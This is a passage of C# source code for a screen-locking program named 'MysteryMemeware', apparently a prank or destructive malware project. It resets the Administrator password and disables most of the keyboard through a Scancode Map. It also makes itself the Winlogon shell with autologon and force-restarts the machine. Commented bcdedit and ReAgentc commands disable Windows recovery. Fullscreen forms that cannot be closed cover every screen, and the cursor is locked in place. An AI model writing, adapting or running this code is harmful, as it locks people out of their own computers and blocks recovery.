                }

                System.Diagnostics.ProcessStartInfo changeAdminPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();

                changeAdminPasswordStartInfo.Arguments = "user \"Administrator\" \"" + newAdminPassword + "\"";
                changeAdminPasswordStartInfo.CreateNoWindow = true;
                changeAdminPasswordStartInfo.Domain = null;
                changeAdminPasswordStartInfo.ErrorDialog = false;
                changeAdminPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    changeAdminPasswordStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    changeAdminPasswordStartInfo.FileName = "net.exe";
                }

                changeAdminPasswordStartInfo.LoadUserProfile = false;
                changeAdminPasswordStartInfo.Password = null;
                changeAdminPasswordStartInfo.PasswordInClearText = null;
                changeAdminPasswordStartInfo.RedirectStandardError = false;
                changeAdminPasswordStartInfo.RedirectStandardInput = false;
                changeAdminPasswordStartInfo.RedirectStandardOutput = false;
                changeAdminPasswordStartInfo.StandardErrorEncoding = null;
                changeAdminPasswordStartInfo.StandardOutputEncoding = null;
                changeAdminPasswordStartInfo.UserName = null;
                changeAdminPasswordStartInfo.UseShellExecute = false;
                changeAdminPasswordStartInfo.Verb = "runas";
                changeAdminPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    changeAdminPasswordStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    changeAdminPasswordStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changeAdminPasswordStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_CngAdminPass_A_1 = true;
                }

                while (!changeUserPasswordProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_CngAdminPass_A_2 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_CngAdminPass_A_3 = true;

                        throw null;
                    }
                }

                if (changeUserPasswordProcess.ExitCode is not 0)
                {
                    debugFlag_CngAdminPass_A_4 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_CngAdminPass_A = true;

                debugFlag_CngAdminPass = true;
            }

            #endregion



            //Open the local machine registry in 64 bit mode for use later.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            //Open the software registry for use later.

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            //Set a registry to disable the privacey experience popup when signing into a new user account.

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            //Open up the winlogon registry for user later.

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
            WinLogon.SetValue("Shell", installLocation);

            //Set some registries to automatically sign into the the MysteryUser.

            WinLogon.SetValue("DefaultUserName", username);
            WinLogon.SetValue("DefaultPassword", newUserPassword);
            WinLogon.SetValue("AutoAdminLogon", 1);

            //Close the winlogon registry since we are now completely done using it.

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            //C:\Windows\System32\ReAgentc.exe /disable

            //C:\Windows\System32\bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures
            //C:\Windows\System32\bcdedit.exe /set {current} recoveryenabled No

            //C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
            //C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No

            //C:\Windows\System32\bcdedit.exe /set {bootmgr} displaybootmenu No
            //C:\Windows\System32\bcdedit.exe /set {globalsettings} advancedoptions false
            //C:\Windows\System32\bcdedit.exe /set {current} bootmenupolicy standard

            //Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0

            //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0

            //Note last openned registry stored at Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit

            //Now that we are done installing this software. Open up the settings registry to store some information about the installation.

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("AdministratorPassword", newAdminPassword);
            MysteryMemeware.SetValue("UserPassword", newUserPassword);
            MysteryMemeware.SetValue("IsInstalled", "true");

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            //Close the software registry since we are now completely done using it.

            Software.Flush();
            Software.Close();
            Software.Dispose();

            //Close the local machine registry since we are now completely done using it.

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            #region Restart Computer

            try
            {
                System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();

                restartComputerStartInfo.Arguments = "/r /f /t 0";
                restartComputerStartInfo.CreateNoWindow = true;
                restartComputerStartInfo.Domain = null;
                restartComputerStartInfo.ErrorDialog = false;
                restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
                }
                else
                {
                    restartComputerStartInfo.FileName = "shutdown.exe";
                }

                restartComputerStartInfo.LoadUserProfile = false;
                restartComputerStartInfo.Password = null;
                restartComputerStartInfo.PasswordInClearText = null;
                restartComputerStartInfo.RedirectStandardError = false;
                restartComputerStartInfo.RedirectStandardInput = false;
                restartComputerStartInfo.RedirectStandardOutput = false;
                restartComputerStartInfo.StandardErrorEncoding = null;
                restartComputerStartInfo.StandardOutputEncoding = null;
                restartComputerStartInfo.UserName = null;
                restartComputerStartInfo.UseShellExecute = false;
                restartComputerStartInfo.Verb = "runas";
                restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    restartComputerStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    restartComputerStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
            }
            catch
            {
                try
                {
                    System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();

                    restartComputerStartInfo.Arguments = "/r /f /t 0";
                    restartComputerStartInfo.CreateNoWindow = true;
                    restartComputerStartInfo.Domain = null;
                    restartComputerStartInfo.ErrorDialog = false;
                    restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    if (system32Path is not null)
                    {
                        restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
                    }
                    else
                    {
                        restartComputerStartInfo.FileName = "shutdown.exe";
                    }

                    restartComputerStartInfo.LoadUserProfile = false;
                    restartComputerStartInfo.Password = null;
                    restartComputerStartInfo.PasswordInClearText = null;
                    restartComputerStartInfo.RedirectStandardError = false;
                    restartComputerStartInfo.RedirectStandardInput = false;
                    restartComputerStartInfo.RedirectStandardOutput = false;
                    restartComputerStartInfo.StandardErrorEncoding = null;
                    restartComputerStartInfo.StandardOutputEncoding = null;
                    restartComputerStartInfo.UserName = null;
                    restartComputerStartInfo.UseShellExecute = false;
                    restartComputerStartInfo.Verb = null;
                    restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    if (system32Path is not null)
                    {
                        restartComputerStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        restartComputerStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
                }
                catch
                {

                }
            }

            #endregion
        }



        //Pending Approval
        public static void Run()
        {
            //VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();

            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {

                int localScreenIndex = screenIndex;
                System.Threading.Thread thread = new System.Threading.Thread(() =>
                {
                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
                    form.ShowDialog();
                });
                thread.Start();
            }

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        //Pending Approval
        private sealed class MainForm : System.Windows.Forms.Form
        {
            public static void SetVolume()
            {
                System.Threading.Thread childThread = new System.Threading.Thread(() =>
                {
                    System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
                    while (true)
                    {
                        for (int i = 0; i < 50; i++)
                        {
                            SendMessage(processHandle, 793, processHandle, 655360);
                        }
                        System.Threading.Thread.Sleep(1000);
                    }
                });
                childThread.Start();
            }
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern System.IntPtr SendMessage(System.IntPtr WMAppCommandProcessHandle, uint WMAppCommand, System.IntPtr AppCommandProcessHandle, uint appCommand);
            public MainForm(int screenID, System.Drawing.Image coverImage)
            {
                this.BackColor = System.Drawing.Color.White;

                this.ShowInTaskbar = false;

                this.TopMost = true;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;

                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;

                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];

                this.Location = screen.Bounds.Location;
                this.Width = screen.Bounds.Width;
                this.Height = screen.Bounds.Height;

                CustomPictureBox pictureBox = new CustomPictureBox();

                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;

                double viewPortWidth = screen.Bounds.Width;
                double viewPortHeight = screen.Bounds.Height;

                double renderWidth = viewPortHeight * targetAspectRatio;
                double renderHeight = viewPortWidth / targetAspectRatio;

                if (renderWidth > viewPortWidth)
                {
                    renderWidth = viewPortWidth;
                }
                if (renderHeight > viewPortHeight)
                {
                    renderHeight = viewPortHeight;
                }

                double renderX = (viewPortWidth - renderWidth) / 2;
                double renderY = (viewPortHeight - renderHeight) / 2;

                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
                pictureBox.Width = (int)renderWidth;
                pictureBox.Height = (int)renderHeight;

                pictureBox.Image = coverImage;
                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;

                this.Controls.Add(pictureBox);

                this.FormClosing += OnFormClosing;

                this.Load += OnFormLoad;

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }

            private void OnFormLoad(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
                timer.Tick += OnTimerTick;
                timer.Interval = 1000;
                timer.Start();

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnTimerTick(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
            {
                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
            }
        }
    }
}